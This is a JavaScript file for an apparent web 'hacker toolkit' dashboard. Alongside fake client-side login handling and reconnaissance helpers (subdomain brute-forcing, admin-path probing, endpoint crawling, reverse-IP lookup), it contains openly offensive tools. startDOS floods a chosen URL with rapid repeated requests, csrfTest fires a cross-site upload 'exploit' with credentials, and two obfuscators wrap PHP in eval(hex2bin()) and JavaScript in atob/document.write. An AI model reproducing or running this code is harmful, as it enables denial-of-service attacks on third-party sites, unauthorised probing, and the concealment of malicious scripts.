/* script.js - Full Code */

window.showPage = function(id) {
  if (window.location.pathname.includes('contact.html')) {
    window.location.href = 'index.html#' + id;
    return;
  }
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const page = document.getElementById(id);
  if (page) page.classList.add('active');
}

window.hideAllPages = function() {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
}

function login() {
  localStorage.setItem('authToken', btoa(JSON.stringify({
    username: 'DavaXbott',
    expired: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
  })));
  window.location.href = 'index.html';
}

function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  const backdrop = document.getElementById('backdrop');
  if (sidebar) {
    sidebar.classList.toggle('active');
    if (backdrop) {
      backdrop.style.display = sidebar.classList.contains('active') ? 'block' : 'none';
    }
  }
}

function logout() {
  localStorage.removeItem('authToken');
  window.location.href = 'login.html';
}

const token = localStorage.getItem('authToken');
if (!token && !window.location.href.includes('login.html') && !window.location.href.includes('contact.html')) {
  window.location.href = 'login.html';
}

function loadUserInfo() {
  try {
    if (!token) return;
    const payload = JSON.parse(atob(token));
    document.querySelectorAll('#sidebarUsername').forEach(el => {
      if (el) el.textContent = payload.username || 'DavaXbott';
    });
  } catch (e) {}
}

function updateDateTime() {
  const el = document.getElementById('dateTime');
  if (el) {
    const now = new Date();
    el.innerHTML = '<i class="fa-regular fa-calendar"></i> ' +
      now.getFullYear() + '-' + String(now.getMonth() + 1).padStart(2, '0') + '-' + String(now.getDate()).padStart(2, '0') + ' ' +
      String(now.getHours()).padStart(2, '0') + ':' + String(now.getMinutes()).padStart(2, '0') + ':' + String(now.getSeconds()).padStart(2, '0');
  }
}

function copyText(id) {
  const el = document.getElementById(id);
  if (!el || !el.value) return alert('No text to copy!');
  el.select();
  document.execCommand('copy');
  alert('Copied!');
}

function downloadText(id, filename) {
  const el = document.getElementById(id);
  if (!el || !el.value) return alert('No text to download!');
  const blob = new Blob([el.value], { type: 'text/plain' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
}

function clearResult(id, statusId) {
  const el = document.getElementById(id);
  if (el) {
    el.textContent = '';
    if (el.tagName === 'TEXTAREA') el.value = '';
  }
  if (statusId) {
    const st = document.getElementById(statusId);
    if (st) st.textContent = '';
  }
}

function setStatus(id, msg) {
  const el = document.getElementById(id);
  if (el) el.textContent = msg;
}

async function getSource() {
  const url = document.getElementById('srcUrl').value.trim();
  if (!url) return alert('Enter URL!');
  setStatus('srcStatus', 'Fetching source...');
  try {
    const res = await fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(url));
    const text = await res.text();
    document.getElementById('srcResult').value = text;
    setStatus('srcStatus', 'Success!');
  } catch {
    setStatus('srcStatus', 'Failed');
  }
}

fetch('https://api64.ipify.org?format=json')
  .then(r => r.json())
  .then(d => {
    const el = document.getElementById('ipResult');
    if (el) el.textContent = 'IP: ' + d.ip;
  })
  .catch(() => {
    const el = document.getElementById('ipResult');
    if (el) el.textContent = 'Failed';
  });

async function getHeaders() {
  const url = document.getElementById('hdUrl').value.trim();
  if (!url) return alert('Enter URL!');
  try {
    const res = await fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(url));
    let h = '';
    res.headers.forEach((v, k) => h += k + ': ' + v + '\n');
    document.getElementById('hdResult').textContent = h || 'No headers.';
  } catch {
    document.getElementById('hdResult').textContent = 'Failed';
  }
}

async function getDomainIP() {
  const domain = document.getElementById('domInput').value.trim();
  if (!domain) return alert('Enter domain!');
  try {
    const res = await fetch('https://dns.google/resolve?name=' + domain);
    const data = await res.json();
    const ip = data.Answer ? data.Answer.map(a => a.data).join(', ') : 'Not found.';
    document.getElementById('domResult').textContent = 'IP: ' + ip;
  } catch {
    document.getElementById('domResult').textContent = 'Failed';
  }
}

async function getGeoIP() {
  const ip = document.getElementById('geoInput').value.trim();
  if (!ip) return alert('Enter IP!');
  try {
    const res = await fetch('https://ipwho.is/' + ip);
    const data = await res.json();
    if (!data.success) {
      document.getElementById('geoResult').textContent = 'IP not found';
      return;
    }
    document.getElementById('geoResult').textContent =
      'IP: ' + data.ip + '\nCountry: ' + data.country + '\nCity: ' + data.city + '\nISP: ' + data.isp;
  } catch {
    document.getElementById('geoResult').textContent = 'Failed';
  }
}

async function dnsLookup() {
  const domain = document.getElementById('dnsInput').value.trim();
  const type = document.getElementById('dnsType').value;
  if (!domain) return alert('Enter domain!');
  try {
    const res = await fetch('https://dns.google/resolve?name=' + domain + '&type=' + type);
    const data = await res.json();
    let out = 'Record ' + type + ':\n';
    if (data.Answer && data.Answer.length > 0) {
      data.Answer.forEach(a => out += a.data + '\n');
    } else {
      out += 'Not found.';
    }
    document.getElementById('dnsResult').textContent = out;
  } catch {
    document.getElementById('dnsResult').textContent = 'Failed';
  }
}

function minifyHTML() {
  const html = document.getElementById('minifyInput').value;
  if (!html) return alert('Enter HTML!');
  document.getElementById('minifyResult').value = html.replace(/\s+/g, ' ').replace(/>\s+</g, '><').trim();
}

async function findSubdomain() {
  const domain = document.getElementById('subInput').value.trim();
  if (!domain) return alert('Enter domain!');
  document.getElementById('subResult').textContent = 'Searching...';
  const subs = ['www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'cpanel', 'whm', 'blog', 'dev', 'admin', 'forum', 'news', 'vpn', 'mysql', 'support', 'mobile', 'static', 'docs', 'beta', 'shop', 'secure', 'demo', 'wiki', 'media', 'email', 'images', 'download', 'stats', 'dashboard', 'portal', 'login', 'api', 'cdn', 'live', 'video', 'files', 'store', 'panel', 'cloud', 'test', 'upload', 'data', 'backup'];
  let found = [];
  for (let s of subs) {
    try {
      const res = await fetch('https://dns.google/resolve?name=' + s + '.' + domain);
      const data = await res.json();
      if (data.Answer && data.Answer.length > 0) found.push(s + '.' + domain);
    } catch {}
  }
  document.getElementById('subResult').textContent = found.length > 0 ? found.join('\n') : 'Not found.';
}

async function crawlEndpoint() {
  const url = document.getElementById('crawlUrl').value.trim();
  if (!url) return alert('Enter URL!');
  document.getElementById('crawlResult').textContent = 'Crawling...';
  try {
    const res = await fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(url));
    const html = await res.text();
    const matches = html.match(/(?:href|src|action)=["']([^"']+)["']/g);
    let endpoints = [];
    if (matches) {
      matches.forEach(m => {
        const end = m.replace(/(?:href|src|action)=["']/, '').replace(/["']$/, '');
        if (end && !end.startsWith('http') && !end.startsWith('#')) endpoints.push(end);
      });
    }
    document.getElementById('crawlResult').textContent = endpoints.length > 0 ? endpoints.join('\n') : 'Not found.';
  } catch {
    document.getElementById('crawlResult').textContent = 'Failed';
  }
}

function generateHash() {
  const text = document.getElementById('hashInput').value;
  const type = document.getElementById('hashType').value;
  if (!text) return alert('Enter text!');
  let result = '';
  if (type === 'md5') result = CryptoJS.MD5(text).toString();
  else if (type === 'sha1') result = CryptoJS.SHA1(text).toString();
  else if (type === 'sha256') result = CryptoJS.SHA256(text).toString();
  else if (type === 'sha512') result = CryptoJS.SHA512(text).toString();
  document.getElementById('hashResult').textContent = type.toUpperCase() + ': ' + result;
}

function convertText() {
  const text = document.getElementById('convInput').value;
  const type = document.getElementById('convType').value;
  if (!text) return alert('Enter text!');
  let result = '';
  if (type === 'ascii') {
    result = text.split('').map(c => c.charCodeAt(0)).join(' ');
  } else if (type === 'binary') {
    result = text.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
  } else if (type === 'base64') {
    result = btoa(text);
  } else if (type === 'hex') {
    result = text.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
  }
  document.getElementById('convResult').textContent = result;
}

async function reverseIP() {
  const input = document.getElementById('revInput').value.trim();
  if (!input) return alert('Enter domain or IP!');
  document.getElementById('revResult').textContent = 'Searching...';
  try {
    const ip = input.match(/^\d+\.\d+\.\d+\.\d+$/) ? input :
      await fetch('https://dns.google/resolve?name=' + input)
        .then(r => r.json())
        .then(d => d.Answer ? d.Answer[0].data : null);
    if (!ip) {
      document.getElementById('revResult').textContent = 'IP not found.';
      return;
    }
    const res = await fetch('https://api.hackertarget.com/reverseiplookup/?q=' + ip);
    const data = await res.text();
    document.getElementById('revResult').textContent = data || 'Not found.';
  } catch {
    document.getElementById('revResult').textContent = 'Failed';
  }
}

function generateJSO() {
  const text = document.getElementById('jsoInput').value;
  if (!text) return alert('Enter text!');
  const encoded = btoa(unescape(encodeURIComponent(text)));
  document.getElementById('jsoResult').value =
    'var _0x' + Math.random().toString(36).substring(2, 8) + '=atob("' + encoded + '");document.write(_0x' +
    Math.random().toString(36).substring(2, 8) + ');';
}

async function findAdmin() {
  const url = document.getElementById('adminUrl').value.trim();
  if (!url) return alert('Enter URL!');
  document.getElementById('adminResult').textContent = 'Scanning...';
  const paths = ['admin', 'admin.php', 'admin.html', 'administrator', 'login', 'login.php', 'wp-admin', 'dashboard', 'panel', 'cpanel', 'admincp', 'moderator', 'admin/login', 'admin/index', 'admin/dashboard'];
  let found = [];
  for (let p of paths) {
    try {
      const testUrl = url.replace(/\/$/, '') + '/' + p;
      await fetch(testUrl, { mode: 'no-cors' });
      found.push(testUrl);
    } catch {}
  }
  document.getElementById('adminResult').textContent = found.length > 0 ? found.join('\n') : 'Not found.';
}

function obfuscatePHP() {
  const code = document.getElementById('phpInput').value;
  const level = document.getElementById('phpLevel').value;
  if (!code) return alert('Enter PHP code!');
  let result = code;
  if (level === 'low') {
    result = code.replace(/\$([a-zA-Z_]\w*)/g, '$$_$1');
  } else if (level === 'medium') {
    const vars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
    let idx = 0;
    result = code.replace(/\$([a-zA-Z_]\w*)/g, function() {
      return '$' + vars[idx++ % vars.length];
    });
  } else {
    result = code.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    result = 'eval(hex2bin("' + result + '"));';
  }
  document.getElementById('phpResult').value = result;
}

function csrfTest() {
  const url = document.getElementById('csrfUrl').value.trim();
  if (!url) return alert('Enter target URL!');
  document.getElementById('csrfResult').textContent = 'Sending exploit...';
  const field = document.getElementById('csrfField').value || 'file';
  const cookie = document.getElementById('csrfCookie').value;
  const headersRaw = document.getElementById('csrfHeaders').value;
  const headers = {};
  if (headersRaw) {
    headersRaw.split('\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length === 2) headers[parts[0].trim()] = parts[1].trim();
    });
  }
  const formData = new FormData();
  formData.append(field, new Blob(['test'], { type: 'text/plain' }), 'test.txt');
  fetch(url, {
    method: 'POST',
    body: formData,
    headers: headers,
    credentials: cookie ? 'include' : 'omit'
  }).then(() => {
    document.getElementById('csrfResult').textContent = 'Exploit sent!';
  }).catch(() => {
    document.getElementById('csrfResult').textContent = 'Exploit sent (no-cors).';
  });
}

let dosInterval = null;
let dosCount = 0;

function startDOS() {
  const url = document.getElementById('dosUrl').value.trim();
  const dur = parseInt(document.getElementById('dosDuration').value) || 30;
  if (!url) return alert('Enter target URL!');
  if (dosInterval) {
    alert('Attack already running!');
    return;
  }
  dosCount = 0;
  document.getElementById('dosResult').textContent = 'Attacking ' + url + '...';
  dosInterval = setInterval(() => {
    for (let i = 0; i < 20; i++) {
      fetch(url, { mode: 'no-cors' }).catch(() => {});
      dosCount++;
    }
    document.getElementById('dosResult').textContent = 'Packets: ' + dosCount + ' | Target: ' + url;
  }, 100);
  setTimeout(() => {
    clearInterval(dosInterval);
    dosInterval = null;
    document.getElementById('dosResult').textContent = 'Finished. Total packets: ' + dosCount;
  }, dur * 1000);
}

function stopDOS() {
  if (dosInterval) {
    clearInterval(dosInterval);
    dosInterval = null;
    document.getElementById('dosResult').textContent = 'Stopped. Packets: ' + dosCount;
  }
}

document.addEventListener('DOMContentLoaded', function() {
  loadUserInfo();
  updateDateTime();
  setInterval(updateDateTime, 1000);

  if (window.location.hash) {
    const id = window.location.hash.replace('#', '');
    if (document.getElementById(id)) {
      document.getElementById(id).classList.add('active');
    }
  }

  document.querySelectorAll("#sidebar a").forEach(function(link) {
    link.addEventListener("click", function() {
      const sidebar = document.getElementById("sidebar");
      const backdrop = document.getElementById("backdrop");
      if (sidebar) sidebar.classList.remove("active");
      if (backdrop) backdrop.style.display = "none";
    });
  });
});

var canvas = document.getElementById("bg");
if (canvas) {
  var ctx = canvas.getContext("2d");
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  var points = [];
  for (var i = 0; i < 70; i++) {
    points.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      vx: (Math.random() - 0.5) * 0.5,
      vy: (Math.random() - 0.5) * 0.5
    });
  }

  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    points.forEach(function(p) {
      p.x += p.vx;
      p.y += p.vy;
      if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
      if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
      ctx.beginPath();
      ctx.arc(p.x, p.y, 2, 0, Math.PI * 2);
      ctx.fillStyle = "#888";
      ctx.fill();
    });
    for (var i = 0; i < points.length; i++) {
      for (var j = i + 1; j < points.length; j++) {
        var dx = points[i].x - points[j].x;
        var dy = points[i].y - points[j].y;
        var dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 120) {
          ctx.strokeStyle = "rgba(136,136,136," + (1 - dist / 120) + ")";
          ctx.lineWidth = 0.7;
          ctx.beginPath();
          ctx.moveTo(points[i].x, points[i].y);
          ctx.lineTo(points[j].x, points[j].y);
          ctx.stroke();
        }
      }
    }
    requestAnimationFrame(animate);
  }
  animate();
  window.addEventListener("resize", function() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  });
}